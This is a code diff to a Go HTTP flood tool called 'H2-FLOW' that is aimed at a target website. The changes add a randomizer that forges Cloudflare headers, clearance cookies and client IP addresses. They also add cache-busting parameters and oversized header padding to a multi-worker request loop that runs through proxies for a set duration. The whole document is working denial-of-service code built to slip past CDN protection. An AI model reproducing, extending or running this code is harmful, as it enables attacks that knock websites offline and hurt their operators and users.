@@ -4,6 +4,7 @@ import (
 	"bufio"
 	"context"
 	"crypto/tls"
+	"encoding/hex"
 	"fmt"
 	"io"
 	"math/rand"
@@ -13,12 +14,13 @@ import (
 	"os"
 	"os/exec"
 	"os/signal"
-	"runtime"
 	"strconv"
 	"strings"
 	"sync"
 	"syscall"
 	"time"
+
+	cryptorand "crypto/rand"
 )
 
 const (
@@ -36,176 +38,239 @@ const (
 	KEP             = 30 * time.Second
 )
 
-type BPF struct {
-	UA           string
-	Accept       string
-	Lang         string
-	Encoding     string
-	SecChUa      string
-	SecChUaMov   string
-	SecChUaPlat  string
-	SecFetchSite string
-	SecFetchMode string
-	SecFetchDest string
-	Referer      string
-	Origin       string
-	DNT          string
+var (
+	CBP            = []string{"_", "cb", "rnd", "ts", "cache", "v", "ver", "t", "q", "s", "page", "id", "rand", "random"}
+	ifModifiedSince = time.Now().AddDate(-1, 0, 0).Format(time.RFC1123)
+)
+
+type HeaderConfig struct {
+	Accept                  string
+	AcceptEncoding          string
+	AcceptLanguage          string
+	CacheControl            string
+	Connection              string
+	Priority                string
+	Referer                 string
+	SecChUa                 string
+	SecChUaArch             string
+	SecChUaBitness          string
+	SecChUaFullVersionList  string
+	SecChUaMobile           string
+	SecChUaModel            string
+	SecChUaPlatform         string
+	SecChUaPlatformVersion  string
+	SecFetchDest            string
+	SecFetchMode            string
+	SecFetchSite            string
+	SecFetchUser            string
+	SecGpc                  string
+	UpgradeInsecureRequests string
+	UserAgent               string
+	XForwardedFor           string
+	XForwardedProto         string
+	Cookie                  string
+	CFRay                   string
+	CFVisitor               string
+	CfConnectingIp          string
+	XSSLID                  string
+	Origin                  string
+	CFIPCountry             string
+	Unique                  int
 }
 
-var PFS = []BPF{
-	{
-		UA:           "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",
-		Accept:       "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-		Lang:         "en-US,en;q=0.9",
-		Encoding:     "gzip, deflate, br",
-		SecChUa:      `"Chromium";v="144", "Google Chrome";v="144", "Not?A_Brand";v="99"`,
-		SecChUaMov:   "?0",
-		SecChUaPlat:  "Windows",
-		SecFetchSite: "none",
-		SecFetchMode: "navigate",
-		SecFetchDest: "document",
-		Referer:      "https://www.google.com/search?q=",
-		Origin:       "https://www.google.com",
-		DNT:          "",
-	},
-	{
-		UA:           "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36",
-		Accept:       "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
-		Lang:         "en-US,en;q=0.9",
-		Encoding:     "gzip, deflate, br",
-		SecChUa:      `"Chromium";v="143", "Google Chrome";v="143", "Not?A_Brand";v="99"`,
-		SecChUaMov:   "?0",
-		SecChUaPlat:  "macOS",
-		SecFetchSite: "none",
-		SecFetchMode: "navigate",
-		SecFetchDest: "document",
-		Referer:      "https://www.google.com/search?q=",
-		Origin:       "https://www.google.com",
-		DNT:          "",
-	},
-	{
-		UA:           "Mozilla/5.0 (Linux; Android 15; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Mobile Safari/537.36",
-		Accept:       "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
-		Lang:         "en-US,en;q=0.9",
-		Encoding:     "gzip, deflate, br",
-		SecChUa:      `"Chromium";v="146", "Google Chrome";v="146", "Not?A_Brand";v="99"`,
-		SecChUaMov:   "?1",
-		SecChUaPlat:  "Android",
-		SecFetchSite: "none",
-		SecFetchMode: "navigate",
-		SecFetchDest: "document",
-		Referer:      "https://www.google.com/search?q=",
-		Origin:       "https://www.google.com",
-		DNT:          "",
-	},
-	{
-		UA:           "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
-		Accept:       "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
-		Lang:         "en-US,en;q=0.9",
-		Encoding:     "gzip, deflate, br",
-		SecChUa:      "",
-		SecChUaMov:   "",
-		SecChUaPlat:  "",
-		SecFetchSite: "none",
-		SecFetchMode: "navigate",
-		SecFetchDest: "document",
-		Referer:      "https://www.google.com/search?q=",
-		Origin:       "",
-		DNT:          "1",
-	},
-	{
-		UA:           "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:137.0) Gecko/20100101 Firefox/137.0",
-		Accept:       "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
-		Lang:         "en-US,en;q=0.9",
-		Encoding:     "gzip, deflate, br",
-		SecChUa:      "",
-		SecChUaMov:   "",
-		SecChUaPlat:  "",
-		SecFetchSite: "none",
-		SecFetchMode: "navigate",
-		SecFetchDest: "document",
-		Referer:      "https://www.google.com/search?q=",
-		Origin:       "",
-		DNT:          "1",
-	},
-	{
-		UA:           "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36 Edg/145.0.0.0",
-		Accept:       "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-		Lang:         "en-US,en;q=0.9",
-		Encoding:     "gzip, deflate, br",
-		SecChUa:      `"Chromium";v="145", "Microsoft Edge";v="145", "Not?A_Brand";v="99"`,
-		SecChUaMov:   "?0",
-		SecChUaPlat:  "Windows",
-		SecFetchSite: "none",
-		SecFetchMode: "navigate",
-		SecFetchDest: "document",
-		Referer:      "https://www.bing.com/search?q=",
-		Origin:       "https://www.bing.com",
-		DNT:          "",
-	},
-	{
-		UA:           "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 OPR/130.0.0.0",
-		Accept:       "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
-		Lang:         "en-US,en;q=0.9",
-		Encoding:     "gzip, deflate, br",
-		SecChUa:      `"Chromium";v="144", "Opera";v="130", "Not?A_Brand";v="99"`,
-		SecChUaMov:   "?0",
-		SecChUaPlat:  "Windows",
-		SecFetchSite: "none",
-		SecFetchMode: "navigate",
-		SecFetchDest: "document",
-		Referer:      "https://www.google.com/search?q=",
-		Origin:       "https://www.google.com",
-		DNT:          "",
-	},
-	{
-		UA:           "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Safari/605.1.15",
-		Accept:       "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
-		Lang:         "en-US,en;q=0.9",
-		Encoding:     "gzip, deflate, br",
-		SecChUa:      "",
-		SecChUaMov:   "",
-		SecChUaPlat:  "",
-		SecFetchSite: "none",
-		SecFetchMode: "navigate",
-		SecFetchDest: "document",
-		Referer:      "https://www.google.com/search?q=",
-		Origin:       "",
-		DNT:          "",
-	},
-	{
-		UA:           "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
-		Accept:       "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
-		Lang:         "en-US,en;q=0.9",
-		Encoding:     "gzip, deflate, br",
-		SecChUa:      "",
-		SecChUaMov:   "",
-		SecChUaPlat:  "",
-		SecFetchSite: "none",
-		SecFetchMode: "navigate",
-		SecFetchDest: "document",
-		Referer:      "https://www.google.com/search?q=",
-		Origin:       "",
-		DNT:          "",
-	},
+type Randomizer struct {
+	UserAgents          []string
+	SecChUaVersions     []string
+	SecChUaFullVersions []string
+	Languages           []string
+	IPs                 []string
+	CFRayPrefixes       []string
+	CFRayLocations      []string
+	Origins             []string
+	Countries           []string
 }
 
-var CBP = []string{"_", "cb", "rnd", "ts", "cache", "v", "ver", "t", "q", "s", "page", "id", "rand", "random"}
-var COOKIES = []string{"session", "__cfduid", "_ga", "_gid", "visitor", "token", "cf_clearance", "__cf_bm"}
-var REF = []string{
-	"https://www.google.com/search?q=",
-	"https://www.bing.com/search?q=",
-	"https://www.yahoo.com/search?p=",
-	"https://www.duckduckgo.com/?q=",
+func NewRandomizer() *Randomizer {
+	return &Randomizer{
+		UserAgents: []string{
+			"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36",
+			"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36",
+			"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36",
+			"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36",
+		},
+		SecChUaVersions: []string{"149", "150", "148"},
+		SecChUaFullVersions: []string{
+			`"Brave";v="149.0.0.0", "Chromium";v="149.0.0.0", "Not?A_Brand";v="24.0.0.0"`,
+			`"Brave";v="150.0.0.0", "Chromium";v="150.0.0.0", "Not?A_Brand";v="24.0.0.0"`,
+			`"Brave";v="148.0.0.0", "Chromium";v="148.0.0.0", "Not?A_Brand";v="24.0.0.0"`,
+		},
+		Languages: []string{
+			"id-ID,id;q=0.9,en;q=0.8",
+			"en-US,en;q=0.9,id;q=0.8",
+			"en-GB,en;q=0.9",
+		},
+		IPs: []string{
+			"2a09:bac1:6560:8::279:4e",
+			"2a09:bac1:6560:8::279:4f",
+			"2a09:bac1:6560:8::280:4e",
+			"2a09:bac1:6560:8::280:4f",
+		},
+		CFRayPrefixes: []string{
+			"8a0a092ad9d940b0",
+			"8a0a092ad9d940b1",
+			"8a0a092ad9d940b2",
+		},
+		CFRayLocations: []string{"SIN", "JAK", "CGK", "LAX", "FRA", "LHR"},
+		Origins: []string{
+			"2a09:bac1:6560:8::279:4e",
+			"2a09:bac1:6560:8::279:4f",
+			"2a09:bac1:6560:8::280:4e",
+		},
+		Countries: []string{
+			"ID", "SG", "MY", "PH", "TH", "VN", "CN", "JP", "KR", "IN",
+			"PK", "BD", "NP", "LK", "KH", "LA", "MM", "TW", "HK", "MO",
+			"GB", "DE", "FR", "IT", "ES", "NL", "SE", "NO", "DK", "FI",
+			"PL", "CZ", "HU", "AT", "CH", "BE", "PT", "IE", "GR", "RU",
+			"US", "CA", "MX", "BR", "AR", "CL", "CO", "PE", "VE", "EC",
+			"BO", "PY", "UY", "CR", "PA", "GT", "HN", "SV", "NI", "DO",
+			"ZA", "NG", "EG", "KE", "MA", "DZ", "TN", "GH", "CI", "CM",
+			"AU", "NZ", "FJ", "PG", "SB", "VU", "WS", "TO", "FM", "MH",
+		},
+	}
 }
 
-type CLI struct {
-	client *http.Client
-	ip     string
+func randomHex(n int) string {
+	b := make([]byte, n/2)
+	if _, err := cryptorand.Read(b); err != nil {
+		for i := range b {
+			b[i] = byte(rand.Intn(256))
+		}
+	}
+	return hex.EncodeToString(b)
 }
 
-func init() {
-	runtime.GOMAXPROCS(runtime.NumCPU())
+func randomInt(min, max int) int {
+	return rand.Intn(max-min+1) + min
+}
+
+func (r *Randomizer) GenerateCFRay() string {
+	prefix := r.CFRayPrefixes[rand.Intn(len(r.CFRayPrefixes))]
+	loc := r.CFRayLocations[rand.Intn(len(r.CFRayLocations))]
+	return fmt.Sprintf("%s-%s", prefix, loc)
+}
+
+func GenerateCFVisitor() string {
+	schemes := []string{"https", "http"}
+	scheme := schemes[rand.Intn(len(schemes))]
+	return fmt.Sprintf(`{"scheme":"%s"}`, scheme)
+}
+
+func GenerateXSSLID() string {
+	ts := time.Now().Unix()
+	suffix := randomHex(20)
+	return fmt.Sprintf("%d-%s", ts, suffix)
+}
+
+func GenerateCookie() string {
+	clearance := randomHex(32)
+	return fmt.Sprintf("_cf_clearance=%s; __cf_bm=...; __cfruid=...", clearance)
+}
+
+func GenerateRandomIP() string {
+	if rand.Intn(2) == 0 {
+		return fmt.Sprintf("%d.%d.%d.%d", randomInt(1, 255), randomInt(0, 255), randomInt(0, 255), randomInt(1, 255))
+	}
+	parts := make([]string, 8)
+	for i := 0; i < 8; i++ {
+		parts[i] = randomHex(4)
+	}
+	return strings.Join(parts, ":")
+}
+
+func (h *HeaderConfig) Randomize(rng *rand.Rand, r *Randomizer) {
+	if len(r.UserAgents) > 0 {
+		h.UserAgent = r.UserAgents[rng.Intn(len(r.UserAgents))]
+	}
+	if len(r.SecChUaVersions) > 0 {
+		ver := r.SecChUaVersions[rng.Intn(len(r.SecChUaVersions))]
+		h.SecChUa = fmt.Sprintf(`"Brave";v="%s", "Chromium";v="%s", "Not?A_Brand";v="24"`, ver, ver)
+	}
+	if len(r.SecChUaFullVersions) > 0 {
+		h.SecChUaFullVersionList = r.SecChUaFullVersions[rng.Intn(len(r.SecChUaFullVersions))]
+	}
+	if len(r.Languages) > 0 {
+		h.AcceptLanguage = r.Languages[rng.Intn(len(r.Languages))]
+	}
+	if len(r.IPs) > 0 {
+		h.XForwardedFor = r.IPs[rng.Intn(len(r.IPs))]
+	} else {
+		h.XForwardedFor = GenerateRandomIP()
+	}
+	h.CFRay = r.GenerateCFRay()
+	h.CFVisitor = GenerateCFVisitor()
+	h.CfConnectingIp = GenerateRandomIP()
+	h.XSSLID = GenerateXSSLID()
+	if len(r.Origins) > 0 {
+		h.Origin = r.Origins[rng.Intn(len(r.Origins))]
+	} else {
+		h.Origin = GenerateRandomIP()
+	}
+	h.Cookie = GenerateCookie()
+	h.CFIPCountry = r.Countries[rng.Intn(len(r.Countries))]
+	h.Unique = rng.Intn(1000000)
+}
+
+func (h *HeaderConfig) BuildHeader() http.Header {
+	header := make(http.Header)
+	header.Set("Accept", h.Accept)
+	header.Set("Accept-Encoding", h.AcceptEncoding)
+	header.Set("Accept-Language", h.AcceptLanguage)
+	header.Set("Cache-Control", h.CacheControl)
+	header.Set("Connection", h.Connection)
+	header.Set("Priority", h.Priority)
+	header.Set("Referer", h.Referer)
+	header.Set("Sec-Ch-Ua", h.SecChUa)
+	header.Set("Sec-Ch-Ua-Arch", h.SecChUaArch)
+	header.Set("Sec-Ch-Ua-Bitness", h.SecChUaBitness)
+	header.Set("Sec-Ch-Ua-Full-Version-List", h.SecChUaFullVersionList)
+	header.Set("Sec-Ch-Ua-Mobile", h.SecChUaMobile)
+	header.Set("Sec-Ch-Ua-Model", h.SecChUaModel)
+	header.Set("Sec-Ch-Ua-Platform", h.SecChUaPlatform)
+	header.Set("Sec-Ch-Ua-Platform-Version", h.SecChUaPlatformVersion)
+	header.Set("Sec-Fetch-Dest", h.SecFetchDest)
+	header.Set("Sec-Fetch-Mode", h.SecFetchMode)
+	header.Set("Sec-Fetch-Site", h.SecFetchSite)
+	header.Set("Sec-Fetch-User", h.SecFetchUser)
+	header.Set("Sec-Gpc", h.SecGpc)
+	header.Set("Upgrade-Insecure-Requests", h.UpgradeInsecureRequests)
+	header.Set("User-Agent", h.UserAgent)
+	if h.XForwardedFor != "" {
+		header.Set("X-Forwarded-For", h.XForwardedFor)
+	}
+	header.Set("X-Forwarded-Proto", h.XForwardedProto)
+	if h.Cookie != "" {
+		header.Set("Cookie", h.Cookie)
+	}
+	if h.CFRay != "" {
+		header.Set("CF-Ray", h.CFRay)
+	}
+	if h.CFVisitor != "" {
+		header.Set("CF-Visitor", h.CFVisitor)
+	}
+	if h.CfConnectingIp != "" {
+		header.Set("Cf-Connecting-Ip", h.CfConnectingIp)
+	}
+	if h.XSSLID != "" {
+		header.Set("X-Ssl-Id", h.XSSLID)
+	}
+	if h.Origin != "" {
+		header.Set("Origin", h.Origin)
+	}
+	if h.CFIPCountry != "" {
+		header.Set("CF-IPCountry", h.CFIPCountry)
+		header.Set("X-Country", h.CFIPCountry)
+	}
+	return header
 }
 
 func RIP(rng *rand.Rand) string {
@@ -221,7 +286,10 @@ func RST(rng *rand.Rand, length int) string {
 	return string(b)
 }
 
-var ifModifiedSince = time.Now().AddDate(-1, 0, 0).Format(time.RFC1123)
+type CLI struct {
+	client *http.Client
+	ip     string
+}
 
 func createTransport(host string, useCustomResolver bool) *http.Transport {
 	var dialer *net.Dialer
@@ -655,7 +723,6 @@ func runAttack(tgt string, dur int, cookie string) {
 		host = host[4:]
 	}
 
-	// Cek DNS dengan resolver default, jika gagal pakai custom
 	useCustom := false
 	ctxDNS, cancelDNS := context.WithTimeout(context.Background(), 2*time.Second)
 	defer cancelDNS()
@@ -777,7 +844,6 @@ func runAttack(tgt string, dur int, cookie string) {
 	for i, ProxyY := range PRX {
 		tr := attackTransport
 		if ProxyY != nil {
-			// Clone transport untuk proxy
 			tr2 := tr.Clone()
 			tr2.Proxy = http.ProxyURL(ProxyY)
 			tr = tr2
@@ -823,7 +889,7 @@ func runAttack(tgt string, dur int, cookie string) {
 				PUTIH, value, HAPUS)
 		}
 	}
-	printInfo("Author", "Diz Flyze Ofc              ", "True")
+	printInfo("Author", "Diz Flyze + xxiiNN              ", "Hybrid")
 	printInfo("Target", host, "")
 	printInfo("Port  ", "443                        ", "True")
 	printInfo("Method", "GET                       ", "True")
@@ -873,9 +939,9 @@ func runAttack(tgt string, dur int, cookie string) {
 	time.AfterFunc(time.Duration(dur)*time.Second, func() {
 		cancel()
 	})
-	type headerItem struct {
-		key, value string
-	}
+
+	globalRandomizer := NewRandomizer()
+
 	for i := 0; i < Speed; i++ {
 		wg2.Add(1)
 		c := wcs[i%len(wcs)]
@@ -883,30 +949,106 @@ func runAttack(tgt string, dur int, cookie string) {
 			defer wg2.Done()
 			rng := rand.New(rand.NewSource(time.Now().UnixNano() + int64(workerID)))
 			for ctx.Err() == nil {
-				method := "GET"
-				ua := VUAS[rng.Intn(len(VUAS))]
-				ref := VREF[rng.Intn(len(VREF))]
-				enc := VENC[rng.Intn(len(VENC))]
-				cacheCtrl := VCAC[rng.Intn(len(VCAC))]
-				FORIP := ipPool[rng.Intn(len(ipPool))]
+				hc := &HeaderConfig{
+					Accept:                  "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
+					AcceptEncoding:          "gzip, br",
+					AcceptLanguage:          "id-ID,id;q=0.9,en;q=0.8",
+					CacheControl:            "max-age=0",
+					Connection:              "keep-alive",
+					Priority:                "u=0, i",
+					Referer:                 "https://example.com/",
+					SecChUaArch:             "x86",
+					SecChUaBitness:          "64",
+					SecChUaMobile:           "?0",
+					SecChUaModel:            "",
+					SecChUaPlatform:         "Windows",
+					SecChUaPlatformVersion:  "15.0.0",
+					SecFetchDest:            "document",
+					SecFetchMode:            "navigate",
+					SecFetchSite:            "cross-site",
+					SecFetchUser:            "?1",
+					SecGpc:                  "1",
+					UpgradeInsecureRequests: "1",
+					XForwardedProto:         "https",
+					CFIPCountry:             "",
+				}
+				hc.Randomize(rng, globalRandomizer)
+
+				if len(VUAS) > 0 {
+					hc.UserAgent = VUAS[rng.Intn(len(VUAS))]
+				}
+				if len(VENC) > 0 {
+					hc.AcceptEncoding = VENC[rng.Intn(len(VENC))]
+				}
+				if len(VCAC) > 0 {
+					hc.CacheControl = VCAC[rng.Intn(len(VCAC))]
+				}
+
+				headers := hc.BuildHeader()
+				if len(VREF) > 0 {
+					ref := VREF[rng.Intn(len(VREF))]
+					headers.Set("Referer", ref)
+				}
+				if len(VORI) > 0 {
+					origin := VORI[rng.Intn(len(VORI))]
+					headers.Set("Origin", origin)
+				}
+				if cookie != "" {
+					headers.Set("Cookie", cookie)
+				}
 				realIP := cli.ip
 				if realIP == "" {
-					realIP = FORIP
+					realIP = hc.XForwardedFor
 				}
-				SLOR := VORI[rng.Intn(len(VORI))]
-				OPRF := GPFO(SLOR, host)
-				prof := PFS[rng.Intn(len(PFS))]
+				headers.Set("X-Real-IP", realIP)
+				if Supported["X-Original-URL"] && rng.Intn(3) == 0 {
+					headers.Set("X-Original-URL", "/"+strconv.FormatInt(rng.Int63(), 16))
+				}
+				if Supported["X-Forwarded-Host"] && rng.Intn(3) == 0 {
+					headers.Set("X-Forwarded-Host", strconv.FormatInt(rng.Int63(), 16)+"t.me/ytdizflyze")
+				}
+				if Supported["X-Request-ID"] && rng.Intn(3) == 0 {
+					headers.Set("X-Request-ID", strconv.FormatInt(rng.Int63(), 16))
+				}
+				if Supported["CF-Connecting-IP"] && rng.Intn(5) == 0 {
+					headers.Set("CF-Connecting-IP", realIP)
+				}
+				if Supported["True-Client-IP"] && rng.Intn(5) == 0 {
+					headers.Set("True-Client-IP", realIP)
+				}
+				if Supported["CDN-Loop"] && rng.Intn(5) == 0 {
+					headers.Set("CDN-Loop", "cloudflare")
+				}
+				headers.Set("X-Forwarded-For", realIP+", "+RIP(rng))
+				headers.Set("X-Originating-IP", realIP)
+				headers.Set("X-Remote-IP", realIP)
+				headers.Set("X-Remote-Addr", realIP)
+				headers.Set("X-Client-IP", realIP)
+				headers.Set("X-Cache-Buster", strconv.FormatInt(rng.Int63(), 16))
+				headers.Set("If-Modified-Since", ifModifiedSince)
+				headers.Set("Range", "bytes=0-")
+				headers.Set("If-None-Match", `"`+RST(rng, 16)+`"`)
+				headers.Set("Pragma", "no-cache")
+				headers.Set("Upgrade-Insecure-Requests", "1")
+				if MaxHead > 0 && rng.Intn(2) == 0 {
+					size := MaxHead/2 + rng.Intn(MaxHead/2)
+					if size < 1 {
+						size = 512
+					}
+					headers.Set("X-Large-Data", strings.Repeat("x", size))
+				}
 				params := []string{}
 				for j := 0; j < 2+rng.Intn(2); j++ {
 					key := CBP[rng.Intn(len(CBP))]
 					val := strconv.FormatInt(rng.Int63(), 10)
 					params = append(params, key+"="+val)
 				}
-				var targetURL string
-				if strings.Contains(tgt, "?") {
-					targetURL = tgt + "&" + strings.Join(params, "&")
+				params = append(params, fmt.Sprintf("_=%d", hc.Unique))
+				targetURL := tgt
+				if strings.Contains(targetURL, "?") {
+					targetURL += "&" + strings.Join(params, "&")
 				} else {
-					targetURL = tgt + "?" + strings.Join(params, "&")
+					targetURL += "?" + strings.Join(params, "&")
 				}
 				if MaxP > 0 && rng.Intn(3) == 0 {
 					size := MaxP/2 + rng.Intn(MaxP/2)
@@ -918,96 +1060,8 @@ func runAttack(tgt string, dur int, cookie string) {
 				if rng.Intn(10) == 0 {
 					targetURL += "&" + RST(rng, 8) + "=" + RST(rng, 12)
 				}
-				var body io.Reader = nil
-				req, _ := http.NewRequest(method, targetURL, body)
-				headers := []headerItem{}
-				headers = append(headers, headerItem{"User-Agent", ua})
-				headers = append(headers, headerItem{"Accept-Encoding", enc})
-				headers = append(headers, headerItem{"Cache-Control", cacheCtrl})
-				if OPRF.Origin != "" && OPRF.Referer != "" {
-					headers = append(headers, headerItem{"Referer", OPRF.Referer})
-				} else if ref != "" {
-					headers = append(headers, headerItem{"Referer", ref})
-				}
-				if OPRF.Origin != "" {
-					headers = append(headers, headerItem{"Origin", OPRF.Origin})
-				}
-				headers = append(headers, headerItem{"Sec-Fetch-Site", OPRF.SecFetchSite})
-				headers = append(headers, headerItem{"Accept", prof.Accept})
-				headers = append(headers, headerItem{"Accept-Language", prof.Lang})
-				headers = append(headers, headerItem{"Connection", "keep-alive"})
-				headers = append(headers, headerItem{"Pragma", "no-cache"})
-				headers = append(headers, headerItem{"Upgrade-Insecure-Requests", "1"})
-				headers = append(headers, headerItem{"If-Modified-Since", ifModifiedSince})
-				headers = append(headers, headerItem{"X-Cache-Buster", strconv.FormatInt(rng.Int63(), 16)})
-				if prof.SecChUa != "" {
-					headers = append(headers, headerItem{"Sec-Ch-Ua", prof.SecChUa})
-					headers = append(headers, headerItem{"Sec-Ch-Ua-Mobile", prof.SecChUaMov})
-					headers = append(headers, headerItem{"Sec-Ch-Ua-Platform", prof.SecChUaPlat})
-				}
-				headers = append(headers, headerItem{"Sec-Fetch-Mode", prof.SecFetchMode})
-				headers = append(headers, headerItem{"Sec-Fetch-Dest", prof.SecFetchDest})
-				if prof.DNT != "" {
-					headers = append(headers, headerItem{"DNT", prof.DNT})
-				}
-				if Supported["X-Original-URL"] && rng.Intn(3) == 0 {
-					headers = append(headers, headerItem{"X-Original-URL", "/" + strconv.FormatInt(rng.Int63(), 16)})
-				}
-				if Supported["X-Forwarded-Host"] && rng.Intn(3) == 0 {
-					headers = append(headers, headerItem{"X-Forwarded-Host", strconv.FormatInt(rng.Int63(), 16) + "t.me/ytdizflyze"})
-				}
-				if Supported["X-Request-ID"] && rng.Intn(3) == 0 {
-					headers = append(headers, headerItem{"X-Request-ID", strconv.FormatInt(rng.Int63(), 16)})
-				}
-				if Supported["CF-Connecting-IP"] && rng.Intn(5) == 0 {
-					headers = append(headers, headerItem{"CF-Connecting-IP", realIP})
-				}
-				if Supported["True-Client-IP"] && rng.Intn(5) == 0 {
-					headers = append(headers, headerItem{"True-Client-IP", realIP})
-				}
-				if Supported["CDN-Loop"] && rng.Intn(5) == 0 {
-					headers = append(headers, headerItem{"CDN-Loop", "cloudflare"})
-				}
-				if rng.Intn(5) == 0 {
-					headers = append(headers, headerItem{"X-Real-IP", realIP})
-				}
-				if MaxHead > 0 && rng.Intn(2) == 0 {
-					size := MaxHead/2 + rng.Intn(MaxHead/2)
-					if size < 1 {
-						size = 512
-					}
-					headers = append(headers, headerItem{"X-Large-Data", strings.Repeat("x", size)})
-				}
-				var cookies []string
-				if cookie != "" {
-					cookies = append(cookies, cookie)
-				}
-				for _, name := range COOKIES {
-					if rng.Intn(2) == 0 {
-						cookies = append(cookies, name+"="+strconv.FormatInt(rng.Int63(), 16))
-					}
-				}
-				if len(cookies) > 0 {
-					headers = append(headers, headerItem{"Cookie", strings.Join(cookies, "; ")})
-				}
-				headers = append(headers, headerItem{"X-Forwarded-For", realIP})
-				headers = append(headers, headerItem{"X-Real-IP", realIP})
-				headers = append(headers, headerItem{"Range", "bytes=0-"})
-				headers = append(headers, headerItem{"If-None-Match", `"` + RST(rng, 16) + `"`})
-				headers = append(headers, headerItem{"Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"})
-				headers = append(headers, headerItem{"Accept-Language", "en-US,en;q=0.9,id;q=0.8"})
-				headers = append(headers, headerItem{"X-Forwarded-For", realIP + ", " + RIP(rng)})
-				headers = append(headers, headerItem{"X-Originating-IP", realIP})
-				headers = append(headers, headerItem{"X-Remote-IP", realIP})
-				headers = append(headers, headerItem{"X-Remote-Addr", realIP})
-				headers = append(headers, headerItem{"X-Client-IP", realIP})
-				rng.Shuffle(len(headers), func(i, j int) {
-					headers[i], headers[j] = headers[j], headers[i]
-				})
-				req.Header = make(http.Header)
-				for _, h := range headers {
-					req.Header.Set(h.key, h.value)
-				}
+				req, _ := http.NewRequest("GET", targetURL, nil)
+				req.Header = headers
 				resp, err := cli.client.Do(req)
 				if err == nil {
 					io.Copy(io.Discard, resp.Body)
@@ -1016,6 +1070,7 @@ func runAttack(tgt string, dur int, cookie string) {
 			}
 		}(c, i)
 	}
+
 	sig := make(chan os.Signal, 1)
 	signal.Notify(sig, syscall.SIGINT, syscall.SIGTERM)
 	select {
@@ -1032,7 +1087,7 @@ const webHTML = `<!DOCTYPE html>
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>YT : DIZFLYZE</title>
+    <title>YT : DIZFLYZE + xxiiNN</title>
     <style>
         * { margin:0; padding:0; box-sizing:border-box; }
         body {
@@ -1131,7 +1186,7 @@ const webHTML = `<!DOCTYPE html>
 <body>
 <div class="dashboard">
     <div class="header">
-        <h1>H2-<span>FLOW</span></h1>
+        <h1>H2-<span>FLOW+</span></h1>
         <div class="status"><span class="dot ready" id="statusDot"></span> <span id="statusText">Ready</span></div>
     </div>
     <div class="info-grid">
@@ -1163,7 +1218,7 @@ const webHTML = `<!DOCTYPE html>
         <div class="log-header"><span>Output Terminal</span><span id="log-count">0 Data</span></div>
         <div class="log-content" id="log-content">[system] Ready</div>
     </div>
-    <div class="footer">YT : DIZFLYZE</div>
+    <div class="footer">YT : DIZFLYZE + xxiiNN</div>
 </div>
 <script>
     var attackStartTime = null;
